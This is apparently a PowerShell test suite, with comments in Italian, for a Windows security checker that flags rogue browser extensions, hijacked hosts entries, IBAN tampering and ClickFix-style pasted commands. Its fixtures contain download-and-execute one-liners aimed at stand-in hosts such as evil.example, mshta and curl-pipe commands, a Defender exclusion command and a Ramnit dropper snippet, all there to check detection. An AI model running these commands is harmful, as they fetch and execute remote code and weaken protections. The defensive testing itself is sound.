<#
.SYNOPSIS
    Test automatici di CyberRSecurityCheck.ps1. Eseguire dopo ogni modifica:
        powershell -ExecutionPolicy Bypass -File .\Test-CyberRSecurityCheck.ps1
    Esce con codice 0 se tutti i test passano, 1 altrimenti.
    Non tocca il sistema: lavora solo in una cartella temporanea con profili browser finti.
#>
param([switch]$SkipFullRun)

$ErrorActionPreference = 'Stop'
$here = $PSScriptRoot
$main = Join-Path (Join-Path (Split-Path $here -Parent) 'src') 'CyberRSecurityCheck.ps1'
$script:pass = 0; $script:fail = 0
function Assert {
    param([string]$Name, [scriptblock]$Test)
    try {
        $ok = & $Test
        if ($ok) { $script:pass++; Write-Host "  PASS  $Name" -ForegroundColor Green }
        else { $script:fail++; Write-Host "  FAIL  $Name" -ForegroundColor Red }
    } catch { $script:fail++; Write-Host "  FAIL  $Name -> $($_.Exception.Message)" -ForegroundColor Red }
}

$tmp = Join-Path ([IO.Path]::GetTempPath()) ('cyberrsecuritycheck_test_' + [guid]::NewGuid().ToString('N').Substring(0, 8))
New-Item -ItemType Directory -Path $tmp | Out-Null

Write-Host "`n== Sintassi ==" -ForegroundColor Cyan
$tok = $null; $err = $null
[void][System.Management.Automation.Language.Parser]::ParseFile($main, [ref]$tok, [ref]$err)
Assert 'Lo script non ha errori di sintassi' { $err.Count -eq 0 }

. $main
$ErrorActionPreference = 'Stop'

Write-Host "`n== IBAN ==" -ForegroundColor Cyan
Assert 'IBAN italiano valido' { Test-IbanChecksum 'IT60X0542811101000000123456' }
Assert 'IBAN con spazi valido' { Test-IbanChecksum 'IT60 X054 2811 1010 0000 0123 456' }
Assert 'IBAN tedesco valido' { Test-IbanChecksum 'DE89370400440532013000' }
Assert 'IBAN con una cifra cambiata = non valido' { -not (Test-IbanChecksum 'IT60X0542811101000000123457') }
Assert 'IBAN italiano di lunghezza errata = non valido' { -not (Test-IbanChecksum 'IT60X054281110100000012345') }
Assert 'Testo vuoto = non valido' { -not (Test-IbanChecksum '') }
Assert 'Estrae un IBAN da una frase' { $r = @(Find-Ibans 'Pagare a IBAN IT60X0542811101000000123456 entro venerdi'); $r.Count -eq 1 -and $r[0] -eq 'IT60X0542811101000000123456' }
Assert 'Estrae due IBAN diversi' { @(Find-Ibans 'da IT60X0542811101000000123456 a DE89370400440532013000').Count -eq 2 }
Assert 'Nessun IBAN in testo normale' { @(Find-Ibans 'Fattura numero 12345 del 2026').Count -eq 0 }
Assert 'IBAN scritto con spazi viene normalizzato' { @(Find-Ibans 'IT60 X054 2811 1010 0000 0123 456')[0] -eq 'IT60X0542811101000000123456' }

Write-Host "`n== Percorsi e comandi ==" -ForegroundColor Cyan
Assert 'Percorso tra virgolette' { (Get-ExePathFromCommand '"C:\Program Files\App\app.exe" -x') -eq 'C:\Program Files\App\app.exe' }
Assert 'Percorso senza virgolette con argomenti' { (Get-ExePathFromCommand 'C:\Windows\system32\rundll32.exe C:\x\a.dll,Main') -eq 'C:\Windows\system32\rundll32.exe' }
Assert 'Comando semplice' { (Get-ExePathFromCommand 'notepad.exe file.txt') -eq 'notepad.exe' }
Assert 'Comando vuoto' { (Get-ExePathFromCommand '') -eq '' }
Assert 'AppData\Roaming = rischio 2' { (Get-PathRisk 'C:\Users\Mario\AppData\Roaming\x\y.exe') -eq 2 }
Assert 'Temp = rischio 2' { (Get-PathRisk 'C:\Users\Mario\AppData\Local\Temp\a.exe') -eq 2 }
Assert 'ProgramData = rischio 2' { (Get-PathRisk 'C:\ProgramData\abc\svc.exe') -eq 2 }
Assert 'Downloads = rischio 1' { (Get-PathRisk 'C:\Users\Mario\Downloads\setup.exe') -eq 1 }
Assert 'Program Files = rischio 0' { (Get-PathRisk 'C:\Program Files\Google\Chrome\Application\chrome.exe') -eq 0 }
Assert 'Regex script sospetto: powershell -enc' { 'powershell.exe -nop -w hidden -enc AAAA' -match $script:ScriptHostRegex }
Assert 'Regex script: comando normale non segnalato' { -not ('C:\Program Files\App\app.exe /background' -match $script:ScriptHostRegex) }
Assert 'Data Chrome convertita' { (ConvertFrom-ChromeTime '13300000000000000') -like '2022-*' }

Write-Host "`n== Regole estensioni ==" -ForegroundColor Cyan
$bank = @('relaxbanking.it')
Assert '<all_urls> = accesso a tutti i siti' { Test-BroadHost '<all_urls>' }
Assert '*://*/* = accesso a tutti i siti' { Test-BroadHost '*://*/*' }
Assert 'Dominio specifico non e'' "tutti i siti"' { -not (Test-BroadHost 'https://www.google.com/*') }
Assert 'Host della banca riconosciuto' { Test-BankHost 'https://*.relaxbanking.it/*' $bank }
Assert 'Estensione da cartella con accesso a tutti i siti = CONFERMATO' { (Get-ExtensionRisk -LocationCode 4 -Hosts @('<all_urls>') -ContentMatches @() -Perms @() -FromStore $false -BankDomains $bank).Severity -eq 'ALTA' }
Assert 'Estensione da cartella senza accesso ai siti = da controllare' { (Get-ExtensionRisk -LocationCode 4 -Hosts @() -ContentMatches @() -Perms @() -FromStore $false -BankDomains $bank).Severity -eq 'MEDIA' }
Assert 'Estensione da riga di comando sul sito banca = CONFERMATO' { (Get-ExtensionRisk -LocationCode 8 -Hosts @('https://*.relaxbanking.it/*') -ContentMatches @() -Perms @() -FromStore $false -BankDomains $bank).Severity -eq 'ALTA' }
Assert 'Store + tutti i siti (adblock, password manager) = solo dettaglio' { (Get-ExtensionRisk -LocationCode 1 -Hosts @('<all_urls>') -ContentMatches @() -Perms @() -FromStore $true -BankDomains $bank).Severity -eq 'BASSA' }
Assert 'Store + sito banca = da controllare' { (Get-ExtensionRisk -LocationCode 1 -Hosts @() -ContentMatches @('https://*.relaxbanking.it/*') -Perms @() -FromStore $true -BankDomains $bank).Severity -eq 'MEDIA' }
Assert 'Fuori store + sito banca = CONFERMATO' { (Get-ExtensionRisk -LocationCode 1 -Hosts @() -ContentMatches @('https://*.relaxbanking.it/*') -Perms @() -FromStore $false -BankDomains $bank).Severity -eq 'ALTA' }
Assert 'Tutti i siti fuori dallo store = ALTA' { (Get-ExtensionRisk -LocationCode 1 -Hosts @('*://*/*') -ContentMatches @() -Perms @() -FromStore $false -BankDomains $bank).Severity -eq 'ALTA' }
Assert 'Estensione innocua = nessun allarme' { (Get-ExtensionRisk -LocationCode 1 -Hosts @('https://translate.google.com/*') -ContentMatches @() -Perms @('storage') -FromStore $true -BankDomains $bank).Severity -eq '' }
Assert 'Componente del browser ignorato' { (Get-ExtensionRisk -LocationCode 5 -Hosts @('<all_urls>') -ContentMatches @() -Perms @() -FromStore $false -BankDomains $bank).Severity -eq '' }
Assert 'Estensione da policy senza accessi = nessun allarme' { (Get-ExtensionRisk -LocationCode 9 -Hosts @() -ContentMatches @() -Perms @() -FromStore $true -BankDomains $bank).Severity -eq '' }

Write-Host "`n== Profilo Chrome finto ==" -ForegroundColor Cyan
$user = Join-Path $tmp 'Mario'
$prof = Join-Parts $user @('AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default')
$ext1 = Join-Parts $prof @('Extensions', 'aaaabbbbccccddddeeeeffffgggghhhh', '1.2.0_0')
New-Item -ItemType Directory -Path (Join-Parts $ext1 @('_locales', 'en')) -Force | Out-Null
Set-Content -LiteralPath (Join-Path $ext1 'manifest.json') -Value '{"manifest_version":3,"name":"__MSG_appName__","default_locale":"en","version":"1.2.0","update_url":"https://clients2.google.com/service/update2/crx","permissions":["storage","clipboardWrite"],"content_scripts":[{"matches":["<all_urls>"],"js":["c.js"]}]}'
Set-Content -LiteralPath (Join-Parts $ext1 @('_locales', 'en', 'messages.json')) -Value '{"appName":{"message":"PDF Converter Pro"}}'
$unpacked = Join-Path $tmp 'nascosta'
New-Item -ItemType Directory -Path $unpacked -Force | Out-Null
Set-Content -LiteralPath (Join-Path $unpacked 'manifest.json') -Value '{"manifest_version":2,"name":"Google Docs Helper","version":"0.1","permissions":["webRequest","webRequestBlocking","https://*.relaxbanking.it/*"]}'
$prefs = @{ extensions = @{ ui = @{ developer_mode = $true }; settings = @{
            'iiiijjjjkkkkllllmmmmnnnnoooopppp' = @{ location = 4; path = $unpacked; state = 1; install_time = '13370000000000000' }
            'aaaabbbbccccddddeeeeffffgggghhhh' = @{ location = 1; from_webstore = $true; state = 1 }
        } } } | ConvertTo-Json -Depth 6
Set-Content -LiteralPath (Join-Path $prof 'Secure Preferences') -Value $prefs
Set-Content -LiteralPath (Join-Path $prof 'Preferences') -Value '{"profile":{"name":"Persona 1"}}'

$script:Findings.Clear()
$rows = @(Get-ChromiumExtensions -UserDirs @($user) -BankDomains $bank)
Assert 'Trovate 2 estensioni' { $rows.Count -eq 2 }
$r1 = $rows | Where-Object { $_.Id -eq 'aaaabbbbccccddddeeeeffffgggghhhh' }
$r2 = $rows | Where-Object { $_.Id -eq 'iiiijjjjkkkkllllmmmmnnnnoooopppp' }
Assert 'Nome tradotto da _locales (__MSG_appName__)' { $r1.Nome -eq 'PDF Converter Pro' }
Assert 'Estensione store con script su tutti i siti = solo dettaglio' { $r1.Rischio -eq 'BASSA' }
Assert 'Estensione non impacchettata con accesso alla banca = ALTA' { $r2.Rischio -eq 'ALTA' -and $r2.Motivi -like '*banca*' }
Assert 'Host MV2 dentro permissions estratto' { $r2.Host -like '*relaxbanking*' }
Assert 'Segnalata modalita sviluppatore' { @($script:Findings | Where-Object { $_.Titolo -like '*sviluppatore*' }).Count -eq 1 }
Assert 'Allarme solo per l estensione certa, le altre raggruppate nei dettagli' { @($script:Findings | Where-Object { $_.Categoria -eq 'Estensioni browser' -and $_.Gravita -eq 'ALTA' }).Count -eq 1 -and @($script:Findings | Where-Object { $_.Categoria -eq 'Estensioni browser' -and $_.Gravita -eq 'BASSA' }).Count -eq 1 }
Assert 'Nessun allarme duplicato' { $c = $script:Findings.Count; Add-Finding 'ALTA' 'X' 'Doppio' 'd'; Add-Finding 'ALTA' 'X' 'Doppio' 'd'; $script:Findings.Count -eq $c + 1 }

Write-Host "`n== Elenco autorizzati (config.json) ==" -ForegroundColor Cyan
$cfgFile = Join-Path $tmp 'config.json'
Set-Content -LiteralPath $cfgFile -Value '{"_nota":"test","AllowExtensionIds":["iiiijjjjkkkkllllmmmmnnnnoooopppp"],"AllowRemoteTools":["AnyDesk"],"BankDomains":["relaxbanking.it"]}'
$script:Config = Import-CyberConfig $cfgFile
Assert 'Config letta' { @($script:Config['AllowExtensionIds']).Count -eq 1 -and $script:Config['RecentDays'] -eq 30 }
Assert 'Chiave _nota ignorata' { -not $script:Config.Contains('_nota') }
$script:Findings.Clear()
$null = Get-ChromiumExtensions -UserDirs @($user) -BankDomains $bank
$fa = @($script:Findings | Where-Object { $_.Titolo -like '*Docs Helper*' })[0]
Assert 'Estensione autorizzata declassata a dettaglio' { $fa.Gravita -eq 'BASSA' -and $fa.Titolo -like '`[AUTORIZZATO`]*' }
Assert 'Con estensione autorizzata nessun allarme CONFERMATO' { @($script:Findings | Where-Object { $_.Gravita -eq 'ALTA' }).Count -eq 0 }
Assert 'Accesso remoto autorizzato (contiene "anydesk")' { Test-Allowed 'AnyDesk.exe' 'remote' }
Assert 'Accesso remoto non autorizzato' { -not (Test-Allowed 'TeamViewer' 'remote') }
$remoteRows = @(
    [pscustomobject]@{ Tipo = 'Processo'; Nome = 'AnyDesk.exe'; Dettaglio = 'C:\Program Files (x86)\AnyDesk\AnyDesk.exe'; Note = 'PID 1' }
    [pscustomobject]@{ Tipo = 'Servizio'; Nome = 'AnyDesk Service'; Dettaglio = '"C:\Program Files (x86)\AnyDesk\AnyDesk.exe" --service'; Note = 'Running / Auto' }
    [pscustomobject]@{ Tipo = 'Installato'; Nome = 'AnyDesk'; Dettaglio = 'AnyDesk Software GmbH'; Note = '' }
    [pscustomobject]@{ Tipo = 'Log connessioni'; Nome = 'ad.trace'; Dettaglio = 'incoming'; Note = '' }
    [pscustomobject]@{ Tipo = 'Processo'; Nome = 'TeamViewer.exe'; Dettaglio = 'C:\Program Files\TeamViewer\TeamViewer.exe'; Note = 'PID 2' }
)
$script:Findings.Clear()
Add-RemoteToolFindings $remoteRows
$rf = @($script:Findings | Where-Object { $_.Categoria -eq 'Accesso remoto' })
Assert 'Controllo remoto: una sola riga per programma (processo, servizio e installato insieme)' { $rf.Count -eq 2 -and @($rf | Where-Object { $_.Titolo -like '*AnyDesk*' }).Count -eq 1 }
Assert 'Controllo remoto: la riga elenca i componenti trovati' { $a = @($rf | Where-Object { $_.Titolo -like '*AnyDesk*' })[0]; $a.Dettaglio -like '*programma installato (AnyDesk)*' -and $a.Dettaglio -like '*servizio (AnyDesk Service)*' -and $a.Dettaglio -like '*processo in esecuzione (AnyDesk.exe)*' }
Assert 'Controllo remoto autorizzato = dettaglio, altro programma resta da controllare' { (@($rf | Where-Object { $_.Titolo -like '*AnyDesk*' })[0].Gravita -eq 'BASSA') -and (@($rf | Where-Object { $_.Titolo -like '*TeamViewer*' })[0].Gravita -eq 'MEDIA') }
Assert 'Config non valida -> predefinita' { $bad = Join-Path $tmp 'bad.json'; Set-Content -LiteralPath $bad -Value '{ non json'; $c = Import-CyberConfig $bad; @($c['BankDomains']).Count -ge 1 }
$script:Config = $null

Write-Host "`n== Firefox finto ==" -ForegroundColor Cyan
$ff = Join-Parts $user @('AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles', 'abcd.default-release')
New-Item -ItemType Directory -Path $ff -Force | Out-Null
Set-Content -LiteralPath (Join-Path $ff 'prefs.js') -Value 'user_pref("xpinstall.signatures.required", false);'
Set-Content -LiteralPath (Join-Path $ff 'extensions.json') -Value '{"addons":[{"id":"evil@x","type":"extension","location":"app-profile","active":true,"signedState":-1,"version":"1","defaultLocale":{"name":"Evil"},"userPermissions":{"origins":["<all_urls>"],"permissions":["webRequest"]}},{"id":"ok@x","type":"extension","location":"app-profile","active":true,"signedState":2,"version":"1","defaultLocale":{"name":"Buona"},"userPermissions":{"origins":[],"permissions":["storage"]}}]}'
$script:Findings.Clear()
$fr = @(Get-FirefoxExtensions -UserDirs @($user) -BankDomains $bank)
Assert 'Firefox: 2 estensioni' { $fr.Count -eq 2 }
Assert 'Firefox: non firmata = ALTA' { ($fr | Where-Object { $_.Id -eq 'evil@x' }).Rischio -eq 'ALTA' }
Assert 'Firefox: firmata innocua = nessun allarme' { ($fr | Where-Object { $_.Id -eq 'ok@x' }).Rischio -eq '' }
Assert 'Firefox: impostazione firme solo come dettaglio' { @($script:Findings | Where-Object { $_.Titolo -like '*firma delle estensioni*' -and $_.Gravita -eq 'BASSA' }).Count -eq 1 }

Write-Host "`n== File hosts ==" -ForegroundColor Cyan
$hf = Join-Path $tmp 'hosts'
Set-Content -LiteralPath $hf -Value "# commento`n127.0.0.1 localhost`n185.1.2.3 www.relaxbanking.it relaxbanking.it  # dirottato`n10.0.0.5 nas.locale"
$he = @(Get-HostsEntries $hf $bank)
Assert 'hosts: 4 voci lette (commenti esclusi)' { $he.Count -eq 4 }
Assert 'hosts: dominio banca riconosciuto' { @($he | Where-Object { $_.Banca }).Count -eq 2 }
Assert 'hosts: localhost riconosciuto' { @($he | Where-Object { $_.Localhost }).Count -eq 1 }

Write-Host "`n== Confronto con analisi precedente ==" -ForegroundColor Cyan
$prev = @{ Estensioni = @('Chrome|Mario|a|A'); Certificati = @('X|1|CA') ; Software = @('Word|MS') }
$cur = [ordered]@{ Estensioni = @('Chrome|Mario|a|A', 'Chrome|Mario|b|B'); Certificati = @(); Software = @('Word|MS'); NuovaCategoria = @('z') }
$d = @(Compare-Snapshot $prev $cur)
Assert 'Rileva estensione nuova' { @($d | Where-Object { $_.Cambio -eq 'NUOVO' -and $_.Elemento -eq 'Chrome|Mario|b|B' }).Count -eq 1 }
Assert 'Rileva certificato rimosso' { @($d | Where-Object { $_.Cambio -eq 'RIMOSSO' -and $_.Categoria -eq 'Certificati' }).Count -eq 1 }
Assert 'Categoria assente nel vecchio formato ignorata' { @($d | Where-Object { $_.Categoria -eq 'NuovaCategoria' }).Count -eq 0 }
Assert 'Nessuna differenza su elementi uguali' { @($d).Count -eq 2 }
$snap = Get-Snapshot @{ estensioni_chromium = $rows; software = @([pscustomobject]@{ Nome = 'Word'; Editore = 'MS' }) }
Assert 'Istantanea creata dalle sezioni' { @($snap['Estensioni']).Count -eq 2 -and @($snap['Software']).Count -eq 1 }

Write-Host "`n== ClickFix, PowerShell, Ramnit ==" -ForegroundColor Cyan
Assert 'ClickFix: powershell incollato = ALTA' { (Get-RunCommandRisk 'powershell -w h -c "iwr http://x.y/a.ps1|iex"\1') -eq 'ALTA' }
Assert 'ClickFix: mshta con URL = ALTA' { (Get-RunCommandRisk 'mshta https://evil.example/verify.hta') -eq 'ALTA' }
Assert 'ClickFix: curl = ALTA' { (Get-RunCommandRisk 'cmd /c curl -s http://1.2.3.4/x | cmd') -eq 'ALTA' }
Assert 'Esegui: powershell o cmd da soli non sono ClickFix' { (Get-RunCommandRisk 'powershell\1') -eq '' -and (Get-RunCommandRisk 'cmd /c ipconfig /all') -eq '' -and (Get-RunCommandRisk 'https://www.google.it') -eq '' }
Assert 'Esegui: comandi normali non segnalati' { (Get-RunCommandRisk 'notepad\1') -eq '' -and (Get-RunCommandRisk 'regedit') -eq '' -and (Get-RunCommandRisk '\\server\condivisa') -eq '' -and (Get-RunCommandRisk 'cmd') -eq '' }
Assert 'Cronologia PS: download ed esecuzione = MEDIA' { (Get-PsHistoryRisk 'IEX (New-Object Net.WebClient).DownloadString("http://x")') -eq 'MEDIA' }
Assert 'Cronologia PS: esclusione Defender = da controllare' { (Get-PsHistoryRisk 'Add-MpPreference -ExclusionPath C:\Users\x\AppData') -eq 'MEDIA' }
Assert 'Cronologia PS: solo download senza esecuzione ignorato' { (Get-PsHistoryRisk 'Invoke-WebRequest https://x/file.zip -OutFile a.zip') -eq '' }
Assert 'Cronologia PS: comando normale ignorato' { (Get-PsHistoryRisk 'Get-ChildItem C:\temp') -eq '' }
Assert 'Cronologia PS: comandi di CyberRSecurityCheck ignorati' { (Get-PsHistoryRisk 'iex .\CyberRSecurityCheck.ps1') -eq '' }
Assert 'Ramnit: HTML infetto riconosciuto' { Test-RamnitHtml "<html></html><SCRIPT Language=VBScript><!--`nDropFileName = ""svchost.exe""`nWriteData = ""4D5A90000300""" }
Assert 'Ramnit: HTML pulito' { -not (Test-RamnitHtml '<html><body>ciao</body></html>') }

Write-Host "`n== Rete locale (ARP) ==" -ForegroundColor Cyan
$arpRows = @(
    [pscustomobject]@{ IP = '192.168.1.1'; MAC = 'AA-BB-CC-00-00-01' },
    [pscustomobject]@{ IP = '192.168.1.50'; MAC = 'AA-BB-CC-00-00-01' },
    [pscustomobject]@{ IP = '192.168.1.20'; MAC = 'AA-BB-CC-00-00-20' },
    [pscustomobject]@{ IP = '192.168.1.255'; MAC = 'FF-FF-FF-FF-FF-FF' },
    [pscustomobject]@{ IP = '224.0.0.22'; MAC = '01-00-5E-00-00-16' },
    [pscustomobject]@{ IP = '239.255.255.250'; MAC = '01-00-5E-7F-FF-FA' }
)
$an = @(Get-ArpAnomalies $arpRows @('192.168.1.1'))
Assert 'ARP: MAC del gateway condiviso rilevato' { $an.Count -eq 1 -and $an[0].Gateway -and $an[0].IP -like '*192.168.1.50*' }
Assert 'ARP: broadcast e multicast ignorati' { @(Get-ArpAnomalies @($arpRows[3], $arpRows[4], $arpRows[5]) @('192.168.1.1')).Count -eq 0 }

Write-Host "`n== Percorsi dispositivo e punteggio ==" -ForegroundColor Cyan
Assert 'Percorso \Device\HarddiskVolume convertito' { (Convert-DevicePath '\Device\HarddiskVolume3\Users\a\x.exe' @{ '\Device\HarddiskVolume3' = 'C:' }) -eq 'C:\Users\a\x.exe' }
Assert 'Percorso sconosciuto lasciato invariato' { (Convert-DevicePath '\Device\HarddiskVolume9\x.exe' @{}) -eq '\Device\HarddiskVolume9\x.exe' }
Assert 'Punteggio pieno senza problemi' { (Get-SecurityScore 0 0 0 0).Punteggio -eq 100 -and (Get-SecurityScore 0 0 0 0).Giudizio -eq 'Buono' }
Assert 'Un problema grave porta sotto 50' { (Get-SecurityScore 1 0 0 0).Punteggio -le 49 -and (Get-SecurityScore 1 0 0 0).Giudizio -eq 'A rischio' }
Assert 'Molti problemi gravi = Critico' { (Get-SecurityScore 4 5 3 3).Giudizio -eq 'Critico' }
Assert 'Punteggio mai negativo' { (Get-SecurityScore 50 50 50 50).Punteggio -ge 0 }
Assert 'Modulo nativo (memoria) compila' { Initialize-CyberNative }

Write-Host "`n== Regole di certezza ==" -ForegroundColor Cyan
Assert 'IP privati riconosciuti' { (Test-PrivateIp '192.168.1.10') -and (Test-PrivateIp '10.0.0.1') -and (Test-PrivateIp '172.20.1.1') -and -not (Test-PrivateIp '8.8.8.8') -and -not (Test-PrivateIp '172.32.0.1') }
Assert 'Etichette di gravita' { (Get-SevLabel 'ALTA') -eq 'CONFERMATO' -and (Get-SevLabel 'MEDIA') -eq 'DA CONTROLLARE' -and (Get-SevLabel 'BASSA') -eq 'DETTAGLIO' }
$rowsA = New-Object 'System.Collections.Generic.List[object]'
$script:Findings.Clear()
Add-AutorunRow $rowsA 'Registro Run' 'HKCU' 'Updater' 'powershell.exe -w hidden -c "iex (iwr http://evil.example/p.ps1)"'
Assert 'Avvio automatico che scarica ed esegue = CONFERMATO' { @($script:Findings | Where-Object { $_.Gravita -eq 'ALTA' }).Count -eq 1 }
$script:Findings.Clear()
Add-AutorunRow $rowsA 'Registro Run' 'HKLM' 'OneDrive' '"C:\Program Files\Microsoft OneDrive\OneDrive.exe" /background'
Assert 'Avvio automatico normale = nessun allarme' { $script:Findings.Count -eq 0 }

Write-Host "`n== Nuovi controlli ==" -ForegroundColor Cyan
$sys = Join-Path $tmp 'System32'
New-Item -ItemType Directory -Path $sys -Force | Out-Null
Set-Content -LiteralPath (Join-Path $sys 'cmd.exe') -Value 'SHELL-FINTA'
Set-Content -LiteralPath (Join-Path $sys 'osk.exe') -Value 'TASTIERA-ORIGINALE'
$bd0 = @(Find-AccessibilityBackdoor -SysDir $sys)
Assert 'Accessibilita'': file originali = nessun allarme' { $bd0.Count -eq 0 }
Copy-Item -LiteralPath (Join-Path $sys 'cmd.exe') -Destination (Join-Path $sys 'sethc.exe')
$bd1 = @(Find-AccessibilityBackdoor -SysDir $sys)
Assert 'Accessibilita'': sethc.exe identico a cmd.exe = rilevato' { $bd1.Count -eq 1 -and $bd1[0].File -like '*sethc.exe' -and $bd1[0].UgualeA -like '*cmd.exe' }
Assert 'Accessibilita'': cartella inesistente = nessun errore' { @(Find-AccessibilityBackdoor -SysDir (Join-Path $tmp 'manca')).Count -eq 0 }
Assert 'Accessibilita'': senza shell di confronto = nessun allarme' { @(Find-AccessibilityBackdoor -SysDir $sys -ShellPaths @((Join-Path $sys 'nessuna.exe'))).Count -eq 0 }
Assert 'Defender bloccato da criterio = CRITICO' { (Get-DefenderPolicyState 1 $null) -eq 'CRITICO' -and (Get-DefenderPolicyState $null 1) -eq 'CRITICO' }
Assert 'Defender senza criteri di blocco = OK' { (Get-DefenderPolicyState $null $null) -eq 'OK' -and (Get-DefenderPolicyState 0 0) -eq 'OK' }
Assert 'Piano di analisi: almeno 24 controlli con nomi file unici' { $pl = @(Get-CollectPlan); $pl.Count -ge 24 -and @($pl | ForEach-Object { $_[1] } | Select-Object -Unique).Count -eq $pl.Count }
Assert 'System32 = rischio 0' { (Get-PathRisk 'C:\Windows\System32\svchost.exe') -eq 0 }
Assert 'Dominio banca riconosciuto anche come sottodominio' { Test-BankHost 'https://online.relaxbanking.it/*' $bank }
Assert 'Altro dominio non scambiato per la banca' { -not (Test-BankHost 'https://www.google.com/*' $bank) }

Write-Host "`n== Raggruppamento (niente righe ripetute) ==" -ForegroundColor Cyan
$script:Findings.Clear()
Add-PsHistoryFindings 'Mario' @(
    [pscustomobject]@{ Comando = 'irm https://a.example/x | iex'; Rischio = 'MEDIA' }
    [pscustomobject]@{ Comando = 'irm https://b.example/y | iex'; Rischio = 'MEDIA' }
    [pscustomobject]@{ Comando = 'irm https://a.example/x | iex'; Rischio = 'MEDIA' }
    [pscustomobject]@{ Comando = 'iex (iwr https://c.example/z)'; Rischio = 'MEDIA' }
)
$ph = @($script:Findings | Where-Object { $_.Categoria -eq 'ClickFix' })
Assert 'Cronologia PowerShell: una sola riga per utente con il numero di comandi' { $ph.Count -eq 1 -and $ph[0].Titolo -like '3 comandi PowerShell sospetti*Mario' -and $ph[0].Dettaglio -like '*b.example*' }
$script:Findings.Clear()
Add-PsHistoryFindings 'Mario' @([pscustomobject]@{ Comando = 'x | iex'; Rischio = 'MEDIA' }, [pscustomobject]@{ Comando = 'y | iex'; Rischio = 'ALTA' })
Assert 'Cronologia PowerShell: prevale la gravita'' piu'' alta' { $script:Findings.Count -eq 1 -and $script:Findings[0].Gravita -eq 'ALTA' }
$script:Findings.Clear()
Add-PsHistoryFindings 'Mario' @()
Assert 'Cronologia PowerShell pulita = nessuna riga' { $script:Findings.Count -eq 0 }
$script:Findings.Clear()
Add-RemoteToolFindings @(
    [pscustomobject]@{ Tipo = 'Processo'; Nome = 'remoting_host.exe'; Dettaglio = 'C:\Program Files (x86)\Google\Chrome Remote Desktop\remoting_host.exe'; Note = '' }
    [pscustomobject]@{ Tipo = 'Installato'; Nome = 'Chrome Remote Desktop Host'; Dettaglio = 'Google LLC'; Note = '' }
    [pscustomobject]@{ Tipo = 'Servizio'; Nome = 'Chrome Remote Desktop Service'; Dettaglio = '"C:\Program Files (x86)\Google\Chrome Remote Desktop\remoting_host.exe" --type=daemon'; Note = '' }
)
Assert 'Chrome Remote Desktop: una sola riga anche con nomi diversi' { $script:Findings.Count -eq 1 -and $script:Findings[0].Titolo -like '*Chrome Remote Desktop Host' }
Assert 'Nomi alternativi dei programmi remoti unificati' { (Get-RemoteToolName 'client32.exe') -eq 'netsupport' -and (Get-RemoteToolName 'AnyDesk') -eq 'anydesk' }
$script:Findings.Clear()

Write-Host "`n== Giudizio finale ==" -ForegroundColor Cyan
$script:Findings.Clear(); $script:Sections.Clear(); $script:Hardening = @()
$s0 = Get-RunSummary
Assert 'PC pulito: messaggio chiaro e punteggio pieno' { $s0.Messaggio -eq 'Nessun segno di attacco trovato.' -and $s0.Punteggio -eq 100 }
Add-Finding 'MEDIA' 'Test' 'AnyDesk installato' 'd' 'a'
$s1 = Get-RunSummary
Assert 'Solo "da controllare": nessun problema confermato' { $s1.Media -eq 1 -and $s1.Alta -eq 0 -and $s1.Messaggio -like 'Nessun problema confermato*' }
Add-Finding 'ALTA' 'Test' 'IBAN sostituito' 'd' 'a'
$s2 = Get-RunSummary
Assert 'Problema confermato: avviso di non usare il PC per la banca' { $s2.Alta -eq 1 -and $s2.Messaggio -like '*Non usarlo per la banca*' -and $s2.Punteggio -le 49 }
$script:Findings.Clear()
$script:Hardening = @([pscustomobject]@{ Area = 'Rete'; Controllo = 'Firewall'; Stato = 'CRITICO'; Valore = 'spento'; Consiglio = '' })
Assert 'Impostazione sbagliata: segnalata come da correggere, non come attacco' { $s3 = Get-RunSummary; $s3.Critici -eq 1 -and $s3.Alta -eq 0 -and $s3.Messaggio -like '*da correggere*' }
$script:Hardening = @()
for ($i = 1; $i -le 10; $i++) { $st = 'Non disponibile'; if ($i -le 3) { $st = 'OK' }; $script:Sections.Add([pscustomobject]@{ Sezione = "S$i"; Stato = $st; Righe = 0; Secondi = 0; File = ''; Errore = '' }) }
$s4 = Get-RunSummary
Assert 'Meno dell''80% dei controlli: "Analisi incompleta", mai "tutto a posto"' { $s4.Incompleta -and $s4.Giudizio -eq 'Analisi incompleta' -and $s4.Messaggio -like '*Analisi incompleta*' }
$script:Sections.Clear()
for ($i = 1; $i -le 10; $i++) { $st = 'OK'; if ($i -eq 10) { $st = 'Non disponibile' }; $script:Sections.Add([pscustomobject]@{ Sezione = "S$i"; Stato = $st; Righe = 0; Secondi = 0; File = ''; Errore = '' }) }
Assert 'Con il 90% dei controlli l''analisi e'' completa' { -not (Get-RunSummary).Incompleta }
$script:Sections.Clear()
$hr = New-Object 'System.Collections.Generic.List[object]'
Add-HardeningRow $hr 'Credenziali' 'WDigest' 'CRITICO' 'attivo' 'riportarlo a 0' 'MEDIA'
Assert 'Impostazione con segnalazione: riga di configurazione + elemento da controllare' { $hr.Count -eq 1 -and @($script:Findings | Where-Object { $_.Categoria -eq 'Configurazione' -and $_.Gravita -eq 'MEDIA' }).Count -eq 1 }
$script:Findings.Clear()
$script:Config = Import-CyberConfig $cfgFile
$script:Config['AllowPaths'] = @('C:\Programmi\Assistenza\')
$script:Config['AllowCertThumbprints'] = @('AB CD EF')
Assert 'Cartella autorizzata riconosciuta (anche maiuscole/minuscole)' { Test-Allowed 'c:\programmi\assistenza\tool.exe' 'path' }
Assert 'Certificato autorizzato riconosciuto (spazi ignorati)' { Test-Allowed 'ABCDEF' 'cert' }
Assert 'Elemento non autorizzato resta segnalato' { -not (Test-Allowed 'C:\Users\Mario\AppData\x.exe' 'path') }
$script:Config = $null

Write-Host "`n== Testi per il cliente ==" -ForegroundColor Cyan
$at = $null; $ae = $null
$astMain = [System.Management.Automation.Language.Parser]::ParseFile($main, [ref]$at, [ref]$ae)
$calls = @($astMain.FindAll({ param($n) $n -is [System.Management.Automation.Language.CommandAst] -and $n.GetCommandName() -eq 'Add-Finding' }, $true))
$texts = @(foreach ($c in $calls) { foreach ($e in $c.CommandElements) { if ($e -is [System.Management.Automation.Language.StringConstantExpressionAst] -or $e -is [System.Management.Automation.Language.ExpandableStringExpressionAst]) { [string]$e.Value } } })
Assert 'Segnalazioni presenti nel codice (piu'' di 60)' { $calls.Count -gt 60 }
$long = @($texts | Where-Object { $_.Length -gt 220 })
